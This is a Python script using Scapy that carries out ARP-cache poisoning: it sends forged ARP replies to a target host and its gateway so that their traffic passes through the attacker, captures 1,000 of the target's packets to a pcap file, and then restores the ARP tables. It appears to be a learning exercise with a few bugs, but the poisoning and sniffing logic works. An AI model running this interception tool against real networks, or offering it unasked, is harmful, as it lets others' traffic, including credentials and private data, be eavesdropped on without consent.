from scapy.all import *
from scapy.layers.l2 import ARP as ARP
from scapy.layers.l2 import Ether as Ether
import os
import sys
import threading
import signal


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Restoring settings before attack...")
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)

    # tell main thread to end task:
    os.kill(os.getpid(), signal.SIGINT)


def get_mac(ip_address):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)
    for s,r in responses:
        return r[Ether].src
        return None


def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print("[*] Starting ARP Poisoning. (Press Ctrl + C to stop)")

    while True:
        try:
            send(poison_target)
            send(poison_gateway)
            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

    print("[*] Attack completed")
    return


interface = ""
target_ip = "127.0.0.1"
gateway_ip = "172.16.1.254"
packet_count = 1000

# setting up iface
conf.iface = interface

# turning off
conf.verb = 0

print(f"[*] Configuration of interface {interface}")

gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print("[!!!] Failed to retrieve gateway MAC address. Exiting...")
    sys.exit(0)
else:
   print(f"[*] Gateway {gateway_ip} is under address {gateway_mac}")

target_mac = get_mac(target_ip)

if target_mac is None:
    print("[!!!] Failed to retrieve target MAC address. Exiting...")
    sys.exit(0)
else:
    print(f"Target host {target_ip} is under address {target_mac}")

# running infecting thread, I'm not sure if this line should be indented
poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

try:
    print(f"[*] Running sniffer for {packet_count} packets")
    bpf_filter = f"ip host {target_ip}"
    packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)
    # printing caught packets
    wrpcap('arper.pcap', packets)

    # restoring network
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
except KeyboardInterrupt:
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)
